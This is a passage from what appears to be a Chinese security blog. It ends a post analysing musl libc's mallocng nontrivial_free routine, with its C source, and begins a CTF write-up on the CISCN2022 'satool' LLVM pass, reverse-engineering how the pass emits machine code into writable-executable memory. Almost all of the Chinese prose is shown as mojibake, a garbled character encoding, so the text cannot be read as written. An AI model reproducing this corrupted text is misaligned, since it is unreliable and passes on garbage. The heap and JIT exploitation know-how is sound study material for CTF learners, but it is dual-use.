<p>åé¢å®šä¹‰äº†ä¸€ç³»åˆ—çš„å˜é‡ï¼Œçœ‹åˆ°ç¬¬ä¸€ä¸ªifè¯­å¥ï¼š<code>if (((uintptr_t)(start-1) ^ (uintptr_t)end) &gt;= 2*PGSZ &amp;&amp; g-&gt;last_idx)</code>ã€‚å‰é¢ä¸€ä¸ªåˆ¤æ–­æ¡ä»¶æ˜¯åˆ¤æ–­è¿™ä¸ªchunkçš„å¤§å°æ˜¯å¦å¤§äº2é¡µï¼ˆ<code>PGSZ</code>å°±æ˜¯ä¸€é¡µçš„å¤§å°ï¼‰ï¼Œåé¢çš„åˆ™æ˜¯åˆ¤æ–­è¿™ä¸ªchunkæ˜¯å¦æ˜¯ç”±<code>malloc</code>é€šè¿‡<code>mmap</code>åˆ†é…å‡ºæ¥çš„ã€‚è®°å¾—åœ¨åˆ†æ<code>malloc</code>æ—¶æåˆ°å½“åˆ†é…çš„chunkè¿‡å¤§æ—¶ä¼šä½¿ç”¨<code>mmap</code>ç›´æ¥åˆ†é…ä¸”<code>last_idx</code>çš„å€¼ä¼šè¢«è®¾ç½®ä¸º0ã€‚è¿™ä¸ªifè¯­å¥çš„ä¸»è¦ç›®çš„æ˜¯åœ¨é‡Šæ”¾ä¸€ä¸ªè¾ƒå¤§çš„chunkæ—¶ï¼Œå°†è¯¥chunkå†…å«çš„ä¸€äº›é¡µåœ¨å†…æ ¸å±‚é¢ä¸Šé‡Šæ”¾ï¼Œè¿™é€šè¿‡<code>madvice</code>ç³»ç»Ÿè°ƒç”¨æ¥å®ç°ã€‚</p>
<p>å¾€åæ˜¯ä¸€ä¸ªå¾ªç¯ã€‚å¦‚æœè¯¥chunkæ‰€åœ¨çš„<code>meta</code>çš„<code>free_mask</code>ä¸º0ï¼ˆè¡¨ç¤ºå½“å‰çš„chunkæ˜¯è¯¥<code>meta</code>ä¸­å”¯ä¸€ä¸€ä¸ªé‡Šæ”¾çš„chunkï¼‰æˆ–è¯¥chunké‡Šæ”¾åè¯¥<code>meta</code>ä¸­æ‰€æœ‰chunkéƒ½è¢«é‡Šæ”¾ï¼Œåˆ™è·³å‡ºå¾ªç¯ã€‚å¦åˆ™ä¿®æ”¹<code>free_mask</code>ä½åè¿”å›ã€‚è¿™é‡Œé¢çš„if-elseè¯­å¥ä¸ç”¨ç®¡ï¼Œå› ä¸ºæ¶‰åŠé”çš„é—®é¢˜ï¼Œä¸€èˆ¬Linuxç³»ç»Ÿéƒ½ä¼šåŠ é”ï¼Œå› æ­¤elseåŸºæœ¬ä¸ä¼šæ‰§è¡Œåˆ°ã€‚</p>
<p>å¦‚æœé‡Šæ”¾çš„chunkæ—¢ä¸æ˜¯ç¬¬ä¸€ä¸ªï¼Œä¹Ÿä¸æ˜¯æœ€åä¸€ä¸ªï¼Œåˆ™ä¼šæ‰§è¡Œå¾ªç¯åé¢çš„ä»£ç ã€‚åé¢çš„è°ƒç”¨<code>nontrivial_free</code>æ˜¯å…³é”®æ“ä½œï¼Œä¹Ÿæ˜¯æˆ‘ä»¬åˆ©ç”¨çš„çªç ´ç‚¹ã€‚</p>
<h2 id="nontrivial_freesrcmallocmallocngfreec-line-72"><a class="markdownIt-Anchor" href="#nontrivial_freesrcmallocmallocngfreec-line-72"></a> nontrivial_freeï¼ˆ<code>/src/malloc/mallocng/free.c, line 72</code>ï¼‰</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">nontrivial_free</span><span class="params">(<span class="keyword">struct</span> meta *g, <span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line">	<span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">	<span class="type">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">		<span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line">		<span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line">		<span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">			assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">			<span class="type">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">			dequeue(&amp;ctx.active[sc], g);</span><br><span class="line">			<span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">				activate_group(ctx.active[sc]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> free_group(g);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">		assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">		<span class="comment">// might still be active if there were no allocations</span></span><br><span class="line">		<span class="comment">// after last available slot was taken.</span></span><br><span class="line">		<span class="keyword">if</span> (ctx.active[sc] != g) &#123;</span><br><span class="line">			<span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	a_or(&amp;g-&gt;freed_mask, self);</span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">struct</span> mapinfo)&#123; <span class="number">0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¤§å¤šæ•°çš„chunké‡Šæ”¾è¯·æ±‚éƒ½ä¼šæ‰§è¡Œåˆ°è¿™ä¸ªå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯<code>meta</code>ï¼Œç¬¬äºŒä¸ªæ˜¯è¯¥<code>meta</code>å†…éœ€è¦é‡Šæ”¾çš„chunkçš„ç´¢å¼•ã€‚</p>
<p><code>mask</code>æ˜¯<code>free_mask</code>å’Œ<code>avail_mask</code>ç›¸æˆ–çš„ç»“æœï¼ŒäºŒè€…éƒ½æ˜¯æ¯”ç‰¹ä½æ ‡è¯†çš„æ§åˆ¶ä½ã€‚ç¬¬ä¸€ä¸ªåˆ¤æ–­<code>if (mask+self == (2u&lt;&lt;g-&gt;last_idx)-1 &amp;&amp; okay_to_free(g))</code>ä¸­ç¬¬ä¸€ä¸ªæ¡ä»¶æŒ‡çš„æ˜¯è¯¥<code>meta</code>ä¸­æ‰€æœ‰chunkæ˜¯å¦éƒ½å¤„äºè¢«ä½¿ç”¨æˆ–è¢«é‡Šæ”¾çš„çŠ¶æ€ï¼Œç¬¬äºŒä¸ªæ¡ä»¶é€šè¿‡ä¸€ä¸ªå‡½æ•°åˆ¤æ–­è¿™ä¸ªchunkæ˜¯å¦å¯ä»¥é‡Šæ”¾ï¼Œä¸€èˆ¬éƒ½ä¸ºçœŸã€‚è¿›å…¥ifè¯­å¥ä½“ä¸­åˆ¤æ–­è¯¥<code>meta</code>æ˜¯å¦æœ‰ä¸‹ä¸€ä¸ª<code>meta</code>ï¼Œå¦‚æœæœ‰ï¼Œå°†å½“å‰<code>meta</code>å‡ºé“¾è¡¨ï¼Œä¸”å¦‚æœè¯¥<code>meta</code>åœ¨å‡ºé“¾è¡¨ä¹‹å‰æ˜¯é“¾é¦–ä¸”æ­¤æ—¶è¯¥é“¾è¡¨ä¸­è¿˜æœ‰<code>meta</code>ï¼Œåˆ™æ¿€æ´»é“¾é¦–çš„<code>meta</code>ã€‚è¿™é‡Œçš„æ¿€æ´»ï¼ˆ<code>activate_group</code>ï¼‰æ˜¯ä¿®æ”¹äº†<code>avail_mask</code>å€¼ï¼Œå‡½æ•°å†…å¼ºåˆ¶è¦æ±‚è¯¥<code>meta</code>åœ¨ä¿®æ”¹å‰çš„<code>avail_mask</code>ä¸º0ã€‚ç„¶åè°ƒç”¨<code>free_group</code>å¹¶è¿”å›ã€‚</p>
<p>å¦‚æœè¿›å…¥äº†elseè¯­å¥ä½“ï¼Œè¯´æ˜<code>mask=0</code>ï¼Œå³<code>free_mask</code>å’Œ<code>avail_mask</code>å‡ä¸º0ï¼Œè¯¥<code>meta</code>ä¸­æ‰€æœ‰chunkå‡æ­£åœ¨è¢«ä½¿ç”¨ã€‚å¦‚æœè¯¥<code>meta</code>ä¸æ˜¯é“¾é¦–ï¼Œåˆ™å°†è¯¥<code>meta</code>é“¾å…¥é“¾è¡¨ã€‚æœ€åæ›´æ–°<code>free_mask</code>å¹¶è¿”å›ã€‚</p>
<p>è‡³æ­¤ï¼Œæœ‰å…³äºmuslå†…å­˜åˆ†é…ä¸é‡Šæ”¾çš„ç›¸å…³å‡½æ•°å·²ç»åŸºæœ¬åˆ†æå®Œæ¯•ï¼Œä¸‹ä¸€ç¯‡æ–‡ç« å°†é‡ç‚¹ä»‹ç»musl libcçš„åˆ©ç”¨æ–¹å¼ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/LLVM-pass-pwn-%E5%85%A5%E9%97%A8-4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/LLVM-pass-pwn-%E5%85%A5%E9%97%A8-4/" class="post-title-link" itemprop="url">LLVM pass pwn å…¥é—¨ (4)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:38:22" itemprop="dateCreated datePublished" datetime="2023-02-28T22:38:22+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:30:55" itemprop="dateModified" datetime="2023-03-01T11:30:55+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">å­¦ä¹ ç¬”è®°</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/llvm-pass-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">llvm pass pwn ç³»åˆ—</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>25k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>23 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>æœ‰äº†å‰é¢ä¸¤é“é¢˜çš„åˆ†æåŸºç¡€ä¹‹åï¼Œæˆ‘ä»¬ä¸éš¾å‘ç°ï¼ŒLLVMå®é™…ä¸Šå°±æ˜¯ä¸€ç±»åŸºäºC++çš„VM pwnï¼Œæˆ‘ä»¬é€šè¿‡å®šä¹‰ä¸åŒåå­—çš„å‡½æ•°æˆ–å†™å…¥ä¸åŒç±»å‹çš„æŒ‡ä»¤è®©vmåšä¸€äº›äº‹æƒ…ï¼Œå…¶ä¸­å°±åŒ…å«è§¦å‘æ¼æ´ã€‚è¿™ç¯‡æ–‡ç« ç¬”è€…æ¥åˆ†æä¸€ä¸‹2022å¹´ï¼Œä¹Ÿå°±æ˜¯ä»Šå¹´å›½èµ›é¢˜ä¸­çš„satoolè¿™é“é¢˜ã€‚</p>
<h1 id="ciscn2022-satool"><a class="markdownIt-Anchor" href="#ciscn2022-satool"></a> CISCN2022-satool</h1>
<h2 id="step-1-é€šè¿‡readmeäº†è§£è¿™ä¸ªllvm-passçš„åŠŸèƒ½"><a class="markdownIt-Anchor" href="#step-1-é€šè¿‡readmeäº†è§£è¿™ä¸ªllvm-passçš„åŠŸèƒ½"></a> Step 1: é€šè¿‡READMEäº†è§£è¿™ä¸ªLLVM passçš„åŠŸèƒ½</h2>
<p>é™„ä»¶ä¸€å…±ç»™äº†ä¸¤ä¸ªæ–‡ä»¶ï¼Œæœ‰ä¸€ä¸ªæ˜¯readmeæ–‡ä»¶ï¼Œæ‰“å¼€çœ‹çœ‹ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">## Introduction</span><br><span class="line"></span><br><span class="line">A LLVM Pass that can optimize add/sub instructions.</span><br><span class="line"></span><br><span class="line">## How to run</span><br><span class="line"></span><br><span class="line">opt-12 -load ./mbaPass.so -mba &#123;*.bc/*.ll&#125; -S</span><br><span class="line"></span><br><span class="line">## Example</span><br><span class="line"></span><br><span class="line">### IR before optimization</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">define dso_local i64 @foo(i64 %0) local_unnamed_addr #0 &#123;</span><br><span class="line">  %2 = sub nsw i64 %0, 2</span><br><span class="line">  %3 = add nsw i64 %2, 68</span><br><span class="line">  %4 = add nsw i64 %0, 6</span><br><span class="line">  %5 = add nsw i64 %4, -204</span><br><span class="line">  %6 = add nsw i64 %5, %3</span><br><span class="line">  ret i64 %6</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### IR after optimization</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">define dso_local i64 @foo(i64 %0) local_unnamed_addr #0 &#123;</span><br><span class="line">  %2 = mul i64 %0, 2</span><br><span class="line">  %3 = add i64 %2, -132</span><br><span class="line">  ret i64 %3</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ˜¯ä¸€ä¸ªä¼˜åŒ–åŠ å‡æ³•çš„llvm passï¼Œå°±åƒä¸Šé¢ä¾‹å­æ¼”ç¤ºçš„ä¸€æ ·ï¼Œå°†å¤šæ­¥åŠ å‡æ³•è½¬æ¢ä¸ºä¸¤æ­¥çš„ä¹˜æ³•å’ŒåŠ æ³•ï¼Œå³ä¸€ä¸ªç®€å•çš„åˆå¹¶åŒç±»é¡¹çš„ä¼˜åŒ–ã€‚å¯¹äºè¿™ç§æ¶‰åŠç®—æ³•çš„é€†å‘ï¼Œæˆ‘ä»¬ä¸å¦¨é¦–å…ˆæƒ³æƒ³ï¼Œå¦‚æœè‡ªå·±éœ€è¦å®ç°è¿™ä¸ªåŠŸèƒ½ï¼Œåº”è¯¥å¦‚ä½•ç¼–å†™ç®—æ³•ã€‚<br />
ç°åœ¨æˆ‘ä»¬æ¥çœ‹çœ‹æºç ä¸­æœ‰ä»€ä¹ˆæ¼æ´ã€‚</p>
<h2 id="step-2-æ‰¾åˆ°runonfunctionè¦†å†™å‡½æ•°"><a class="markdownIt-Anchor" href="#step-2-æ‰¾åˆ°runonfunctionè¦†å†™å‡½æ•°"></a> Step 2: æ‰¾åˆ°runOnFunctionè¦†å†™å‡½æ•°</h2>
<p>è¿™é“é¢˜çš„æºç ä¸­æ²¡æœ‰æ— åçš„å‡½æ•°ï¼Œè¿™æ˜¯å› ä¸ºç¬¦å·è¡¨è¿˜åœ¨ï¼Œæ›´ä¾¿äºæˆ‘ä»¬ç†è§£ç¨‹åºé€»è¾‘ã€‚å½“ç¬¦å·è¡¨è¿˜åœ¨çš„æ—¶å€™ï¼Œæˆ‘ä»¬åº”è¯¥æ‰¾çš„æ˜¯åŒ¿åå‘½åç©ºé—´çš„å‡½æ•°ï¼Œåˆ«å¿˜äº†ç¬¬ä¸€ç¯‡æ–‡ç« ä¸­æˆ‘ä»¬è‡ªå·±å†™çš„ç¤ºä¾‹ï¼Œå°±æ˜¯å°†å‡½æ•°å£°ä»€ä¹ˆçš„å…¨éƒ¨å†™åœ¨ä¸€ä¸ªåŒ¿åç©ºé—´ä¸­çš„ã€‚ç”±æ­¤æˆ‘ä»¬å¾ˆå®¹æ˜“èƒ½å¤Ÿæ‰¾åˆ°runOnFunctionå‡½æ•°ã€‚</p>
<p><img src="1.png" alt="" /><br />
æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬è¿›å…¥runOnFunctionæŸ¥çœ‹ã€‚</p>
<h2 id="step-3-åˆ†ærunonfunctionå‡½æ•°"><a class="markdownIt-Anchor" href="#step-3-åˆ†ærunonfunctionå‡½æ•°"></a> Step 3: åˆ†ærunOnFunctionå‡½æ•°</h2>
<h3 id="segment-1"><a class="markdownIt-Anchor" href="#segment-1"></a> Segment 1</h3>
<p><img src="2.png" alt="" /><br />
è¿›å…¥å‡½æ•°ï¼Œé¦–å…ˆæ˜¯ä¸€ä¸ªåˆ¤æ–­ï¼Œé€šè¿‡æŠ¥é”™å­—ç¬¦ä¸²ä¿¡æ¯å¯ä»¥å¾—çŸ¥ï¼Œè¿™é‡Œæ˜¯é™å®šæˆ‘ä»¬çš„å‡½æ•°åªèƒ½æœ‰ä¸€ä¸ªå‚æ•°å’Œä¸€ä¸ªåŸºæœ¬å—ã€‚</p>
<h2 id="segment-2"><a class="markdownIt-Anchor" href="#segment-2"></a> Segment 2</h2>
<p><img src="3.png" alt="" /><br />
æ¥ä¸‹æ¥æ˜¯è°ƒç”¨äº†ä¸¤ä¸ªMBAPassç±»ä¸­çš„å‡½æ•°ï¼Œé¦–å…ˆæŸ¥çœ‹MBAPassç±»çš„æ„é€ å‡½æ•°å¯çŸ¥ï¼Œthis+4æŒ‡é’ˆæŒ‡å‘äº†ä¸€ä¸ªmmapç©ºé—´ï¼Œå¤§å°ä¸º0x1000ã€‚é¦–å…ˆå…¶å°†è¿™å—å†…å­˜çš„æƒé™æ”¹ä¸ºå¯å†™å¯æ‰§è¡Œï¼Œç„¶åæ‰§è¡Œäº†handleå‡½æ•°ï¼Œä¹‹åå†å°†æƒé™æ”¹ä¸ºå¯è¯»å¯æ‰§è¡Œï¼Œæ‰§è¡ŒcallCodeå‡½æ•°ã€‚æˆ‘ä»¬è¿˜æ˜¯é¦–å…ˆçœ‹ä¸‹è¿™ä¸¤ä¸ªå‡½æ•°çš„æ‰§è¡Œæµç¨‹ã€‚</p>
<h2 id="step-4-åˆ†æhandleå‡½æ•°"><a class="markdownIt-Anchor" href="#step-4-åˆ†æhandleå‡½æ•°"></a> Step 4: åˆ†æhandleå‡½æ•°</h2>
<p>handleå‡½æ•°ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯MBAPasså¯¹è±¡è‡ªèº«ï¼Œç¬¬äºŒä¸ªå‚æ•°v29æ˜¯llvm.FunctionæŒ‡é’ˆã€‚æ‰“å¼€handleä¸€çœ‹ï¼Œå¥½å®¶ä¼™è¿™ä¹ˆå¤šä»£ç ï¼Œä¸€ç‚¹ç‚¹åˆ†æã€‚</p>
<h3 id="segment-1-2"><a class="markdownIt-Anchor" href="#segment-1-2"></a> Segment 1</h3>
<p><img src="4.png" alt="" /><br />
çŒœæµ‹ï¼šv29æ˜¯ç¬¬ä¸€ä¸ªåŸºæœ¬å—ï¼ŒTerminatoræ˜¯ç»“æŸç¬¦çš„æ„æ€ï¼Œæš‚æ—¶è¿˜ä¸æ¸…æ¥šåˆ°åº•æŒ‡ä»€ä¹ˆï¼ŒOperandæ˜¯æ“ä½œæ•°ã€‚</p>
<h3 id="segment-2-2"><a class="markdownIt-Anchor" href="#segment-2-2"></a> Segment 2</h3>
<p><img src="5.png" alt="" /><br />
æ³¨æ„<strong>è¿™é‡Œçš„llvm::isa</strong>ç›¸å½“äºJavaä¸­çš„instanceofå…³é”®å­—ï¼Œåˆ¤æ–­Operandæ˜¯å¦æ˜¯llvm::constantçš„å®ä¾‹ã€‚å¦‚æœæ˜¯ï¼Œè¯´æ˜è¿™ä¸ªæ“ä½œæ•°æ˜¯ä¸€ä¸ªå¸¸é‡æ•°å€¼ï¼Œéšåå°†å…¶è½¬æ¢ä¸ºæ•´å‹å¸¸é‡å¹¶æœ‰ç¬¦å·æ‰©å±•ã€‚ç„¶åè°ƒç”¨äº†ä»–è‡ªå·±å®šä¹‰çš„å‡½æ•°writeMovImm64ã€‚è¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½æ˜¯æ„å»ºæœºå™¨ç æŒ‡ä»¤ï¼Œä¸€å¼€å§‹æƒ³æŸ¥Intelæ‰‹å†Œå‘ç°çœ‹ä¸æ‡‚ï¼Œåæ¥ç›´æ¥ç”¨åæ±‡ç¼–æ‰è¯•å‡ºæ¥ã€‚<strong>writeMovImm64çš„åŠŸèƒ½æ˜¯ï¼šå½“ç¬¬äºŒä¸ªå‚æ•°ä¸º0æ—¶ï¼Œå‘äº‹å…ˆmmapçš„ç©ºé—´ä¸­å†™å…¥&quot;mov rbx, &lt;ç¬¬ä¸‰ä¸ªå‚æ•°&gt;â€œæŒ‡ä»¤ï¼Œè‹¥ç¬¬äºŒä¸ªå‚æ•°ä¸ä¸º0åˆ™å†™å…¥&quot;mov rax, &lt;ç¬¬ä¸‰ä¸ªå‚æ•°&gt;æŒ‡ä»¤â€ã€‚è¿™ä¸¤ä¸ªæŒ‡ä»¤éƒ½å 10å­—èŠ‚ï¼Œå†™å…¥å®Œæ¯•åæŒ‡é’ˆåç§»10å‡†å¤‡ä¸‹ä¸€æ¬¡å†™å…¥ã€‚åŒç†å¯ä»¥è¯•å‡ºæ¥writeRetå‡½æ•°å°±æ˜¯å†™å…¥ä¸€ä¸ª&quot;ret&quot;æŒ‡ä»¤</strong>ã€‚åŸºäºæ­¤æˆ‘ä»¬ä¹Ÿå¯ä»¥çŸ¥é“this+5è¿™ä¸ªæŒ‡é’ˆçš„ä½œç”¨ï¼Œå…¶æ˜¯ç”¨æ¥ä½œä¸ºmmapç©ºé—´çš„æ¸¸æ ‡ä½¿ç”¨çš„ï¼Œåœ¨æŒ‡é’ˆæŒ‡å‘çš„ä½ç½®å†™å…¥æŒ‡ä»¤ã€‚<br />
<img src="6.png" alt="" /></p>
<h3 id="segment-3"><a class="markdownIt-Anchor" href="#segment-3"></a> Segment 3</h3>
<p><img src="7.png" alt="" /><br />
è¿™é‡Œåˆ¤æ–­æ“ä½œæ•°æ˜¯å¦æ˜¯å‡½æ•°çš„å‚æ•°ã€‚ç„¶åå†™å…¥&quot;mov rbx, 0; ret&quot;æŒ‡ä»¤ã€‚</p>
<h3 id="segment-4"><a class="markdownIt-Anchor" href="#segment-4"></a> Segment 4</h3>
<p><img src="8.png" alt="" /><br />
å¦‚æœæ“ä½œæ•°æ—¢ä¸æ˜¯ç«‹å³æ•°ï¼Œåˆä¸æ˜¯å‚æ•°ï¼Œé‚£å¯èƒ½æ˜¯å±€éƒ¨å˜é‡ã€‚åœ¨elseè¯­å¥å—ä¸­é¦–å…ˆå®ä¾‹åŒ–äº†ä¸¤ä¸ªSTL stackå¯¹è±¡ï¼Œåˆ†åˆ«ä¸ºv25å’Œv26å˜é‡ï¼Œç„¶åè¿›è¡Œäº†pushæ“ä½œã€‚å¦‚æœå†™å…¥æŒ‡é’ˆçš„æ¸¸æ ‡å¤§äºv30ï¼Œå°±ç›´æ¥å†™å…¥ä¸€ä¸ªretæŒ‡ä»¤è¿”å›ï¼ˆ<strong>v30=mmapå†…å­˜èµ·å§‹åœ°å€+0xFF0ï¼Œè®°ä½è¿™ä¸ª0xFF0ï¼Œåé¢æœ‰å…³é”®ä½œç”¨</strong>ï¼‰ã€‚</p>
<h3 id="segment-5"><a class="markdownIt-Anchor" href="#segment-5"></a> Segment 5</h3>
<p><img src="9.png" alt="" /><br />
å†æ¬¡ä¹‹åå¼¹å‡ºäº†ä¸¤ä¸ªæ ˆé¡¶çš„ä¸œè¥¿ï¼Œå…¶ä¸­å°†å…ˆå¼¹å‡ºçš„è½¬åŒ–ä¸ºäº†äºŒå…ƒè¿ç®—ç¬¦å¯¹è±¡ï¼Œå½“è½¬æ¢å‡ºé”™æ—¶è¿˜ä¼šæŠ¥é”™ã€‚è¯´æ˜ä½äºæ ˆé¡¶çš„åº”è¯¥æ˜¯ä¸€ä¸ªäºŒå…ƒè¿ç®—ç¬¦ã€‚</p>
<h3 id="segment-6"><a class="markdownIt-Anchor" href="#segment-6"></a> Segment 6</h3>
<p><img src="10.png" alt="" /><br />
åé¢å°±å¼€å§‹åˆ¤æ–­è¿ç®—ç¬¦çš„ç§ç±»äº†ã€‚è¿˜è®°å¾—è¿ç®—ç¬¦çš„ç§ç±»åº”è¯¥åœ¨å“ªä¸€ä¸ªæ–‡ä»¶é‡Œé¢æŸ¥è¯¢å—ï¼Ÿ<code>llvm/IR/Instructions.def</code>ï¼æŸ¥è¯¢åˆ°13è¡¨ç¤ºçš„æ˜¯åŠ æ³•ï¼Œ15è¡¨ç¤ºçš„æ˜¯å‡æ³•ã€‚è¿™é‡Œçš„æ„æ€æ˜¯äºŒå…ƒè¿ç®—ç¬¦åªèƒ½æ˜¯åŠ æˆ–å‡ï¼Œå¦åˆ™æŠ¥é”™é€€å‡ºã€‚</p>
<h3 id="segment-7"><a class="markdownIt-Anchor" href="#segment-7"></a> Segment 7</h3>
<p><img src="11.png" alt="" /><br />
è¿™é‡Œçš„v20å’Œv19å®¹æ˜“çŒœå‡ºæ¥å°±æ˜¯äºŒå…ƒè¿ç®—ç¬¦çš„ä¸¤ä¸ªæ“ä½œæ•°ã€‚</p>
<p>åé¢é¦–å…ˆåˆ¤æ–­v20æ˜¯å¦æ˜¯å¸¸é‡ã€‚å¦‚æœæ˜¯åˆ™åˆ¤æ–­å…¶å€¼æ˜¯å¦ä¸º1æˆ–-1ã€‚è‹¥æ˜¯åˆ™è°ƒç”¨writeIncå‡½æ•°å†™å…¥&quot;inc rax&quot;æˆ–&quot;dec rax&quot;æŒ‡ä»¤ï¼Œè‹¥ä¸æ˜¯åˆ™è°ƒç”¨writeOpRegå‡½æ•°å†™å…¥&quot;add rax, rbx&quot;æŒ‡ä»¤ï¼ˆç¬¬äºŒä¸ªå‚æ•°æ˜¯1ã€‚è‹¥ç¬¬äºŒä¸ªå‚æ•°ä¸º0å°±æ˜¯&quot;sub rax, rbx&quot;æŒ‡ä»¤ï¼‰ã€‚</p>
<p>å¦‚æœv20æ˜¯å‚æ•°ï¼Œåˆ™åœ¨this+12å¤„åŠ ä¸Šv22ã€‚è‡³äºthis+22æ˜¯ä»€ä¹ˆå°šä¸”ä¸æ¸…æ¥šï¼Œåé¢å†è¡Œåˆ¤æ–­ã€‚</p>
<p>å¦‚æœæ—¢ä¸æ˜¯å¸¸é‡ä¹Ÿä¸æ˜¯å‚æ•°ï¼Œåˆ™pushå‹æ ˆã€‚é€šè¿‡æ ˆåé¢çš„ç±»å‹å¯ä»¥çŸ¥é“ï¼Œv25ä¸­çš„å€¼ä¸€å®šéƒ½æ˜¯æ•´æ•°ï¼Œè€Œv26ä¸­çš„å€¼æ˜¯å¯¹è±¡ï¼Œå…¶å¯ä»¥è¡¨ç¤ºå˜é‡ä¹Ÿå¯ä»¥è¡¨ç¤ºä¸€ä¸ªå¸¸é‡ã€‚</p>
<h3 id="segment-8"><a class="markdownIt-Anchor" href="#segment-8"></a> Segment 8</h3>
<p><img src="12.png" alt="" /><br />
